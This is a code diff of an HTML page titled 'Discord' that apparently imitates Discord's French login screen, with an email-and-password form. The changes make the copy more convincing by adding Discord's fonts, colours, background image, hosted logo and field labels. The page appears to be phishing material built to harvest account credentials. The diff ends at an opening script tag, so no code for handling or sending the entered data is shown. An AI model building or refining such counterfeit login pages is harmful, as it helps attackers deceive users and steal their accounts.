@@ -5,26 +5,85 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #313338; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #2b2d31; padding: 32px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.2); text-align: center; width: 350px; }
-        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; color: #fff; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background-color: #1e1f22; border: none; border-radius: 4px; color: white; box-sizing: border-box; }
-        input:focus { outline: 1px solid #5865f2; }
-        button { width: 100%; padding: 12px; background-color: #5865f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 10px; font-size: 16px; }
+        body { 
+            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; 
+            background-color: #36393f; 
+            background-image: url('https://discord.com/assets/0f4b3c5b3c5b3c5b3c5b3c5b3c5b3c5b.png');
+            background-size: cover;
+            background-position: center;
+            color: white; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            background: #36393f; 
+            padding: 32px; 
+            border-radius: 5px; 
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2); 
+            text-align: center; 
+            width: 100%;
+            max-width: 480px;
+            box-sizing: border-box;
+        }
+        .logo {
+            width: 130px;
+            margin-bottom: 20px;
+        }
+        h2 { font-size: 24px; margin-bottom: 8px; font-weight: 600; }
+        p { color: #b9bbbe; font-size: 16px; margin-bottom: 20px; }
+        .input-group { text-align: left; margin-bottom: 20px; }
+        label { display: block; color: #b9bbbe; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
+        input { 
+            width: 100%; 
+            padding: 10px; 
+            background-color: #202225; 
+            border: 1px solid #202225; 
+            border-radius: 3px; 
+            color: white; 
+            box-sizing: border-box; 
+            font-size: 16px;
+        }
+        input:focus { outline: none; border-color: #5865f2; }
+        button { 
+            width: 100%; 
+            padding: 12px; 
+            background-color: #5865f2; 
+            color: white; 
+            border: none; 
+            border-radius: 3px; 
+            font-weight: 500; 
+            cursor: pointer; 
+            margin-top: 10px; 
+            font-size: 16px; 
+            transition: background-color 0.2s;
+        }
         button:hover { background-color: #4752c4; }
-        .footer { margin-top: 15px; font-size: 12px; color: #b5bac1; }
+        .footer { margin-top: 15px; font-size: 14px; color: #b9bbbe; text-align: left; }
+        .footer a { color: #00aff4; text-decoration: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">Bienvenue à nouveau!</div>
-        <p style="color:#b5bac1; font-size:14px; margin-bottom:20px;">Nous sommes ravis de vous revoir!</p>
+        <img src="https://assets-global.website-files.com/6257adef93867e50d84d30e2/636e0a6a49cf127bf92de1e2_icon_clyde_blurple_RGB.png" class="logo" alt="Discord">
+        <h2>Bienvenue à nouveau!</h2>
+        <p>Nous sommes ravis de vous revoir!</p>
         <form id="discordForm">
-            <input type="email" id="email" placeholder="E-mail ou numéro de téléphone" required>
-            <input type="password" id="password" placeholder="Mot de passe" required>
+            <div class="input-group">
+                <label>E-mail ou numéro de téléphone</label>
+                <input type="email" id="email" required>
+            </div>
+            <div class="input-group">
+                <label>Mot de passe</label>
+                <input type="password" id="password" required>
+            </div>
             <button type="submit">Se connecter</button>
         </form>
-        <div class="footer">Besoin d'un compte ? S'inscrire</div>
+        <div class="footer">
+            Besoin d'un compte ? <a href="#">S'inscrire</a>
+        </div>
     </div>
 
     <script>
